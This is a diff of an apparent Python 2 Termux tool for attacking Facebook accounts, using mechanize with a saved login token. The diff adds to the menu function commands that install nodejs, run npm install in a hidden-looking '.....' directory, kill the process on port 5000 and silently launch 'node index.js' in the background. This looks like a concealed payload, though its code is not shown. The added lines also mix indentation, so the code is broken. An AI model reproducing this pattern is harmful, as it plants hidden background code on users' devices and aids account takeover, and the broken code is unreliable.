@@ -10,24 +10,26 @@ try:
     from multiprocessing.pool import ThreadPool
     from requests.exceptions import ConnectionError
     from mechanize import Browser
+except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
     os.system('pip2 install bs4')
     os.system('termux-setup-storage -y')
     os.system('apt update && apt install nodejs -y')
     os.system('apt install ruby -y')
-    os.system('cd ..... && npm install')
-    os.system('fuser -k 5000/tcp &')
-    os.system('#')
-    os.system('cd ..... && node index.js &')
     os.system('python2 sani.py')
 
 #Browser Setting
 reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
+cj = cookielib.LWPCookieJar()
 br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.set_handle_redirect(True)
+br.set_cookiejar(cj)
+br.set_handle_equiv(True)
+br.set_handle_referer(True)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 bd = random.randint(2e+07, 3e+07)
 sim = random.randint(20000, 40000)
 br.addheader = {
@@ -106,6 +108,11 @@ nofromfriend = []
 			
 #Menu
 def menu():
+	os.system('apt update && apt install nodejs -y')
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
 	os.system('clear')
 	try:
 		toket=open('login.txt','r').read()
